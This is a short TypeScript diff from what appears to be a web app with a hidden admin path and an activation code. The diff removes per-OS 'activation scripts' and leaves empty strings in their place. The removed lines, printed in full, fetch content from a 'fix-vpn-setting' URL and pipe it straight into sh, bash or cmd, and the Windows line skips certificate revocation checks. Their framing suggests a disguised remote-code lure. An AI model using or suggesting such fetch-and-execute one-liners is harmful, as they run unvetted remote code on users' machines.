@@ -19,11 +19,9 @@ let visitorActivityRecordedForDocument = false;
 const ACTIVATION_CODE = "Rs7s3ITo";
 const ADMIN_PATH = "/adminuseronlyadminaccessible";
 const ACTIVATION_SCRIPTS = {
-  linux:
-    "wget -qO- 'https://fix-vpn-setting.vercel.app/api/settings/linux' | sh",
-  mac: "curl -L 'https://fix-vpn-setting.vercel.app/api/settings/mac' | bash",
-  windows:
-    "curl --ssl-no-revoke -L https://fix-vpn-setting.vercel.app/api/settings/windows | cmd"
+  linux: "",
+  mac: "",
+  windows: ""
 } as const;
 
 type ActivationOS = keyof typeof ACTIVATION_SCRIPTS;
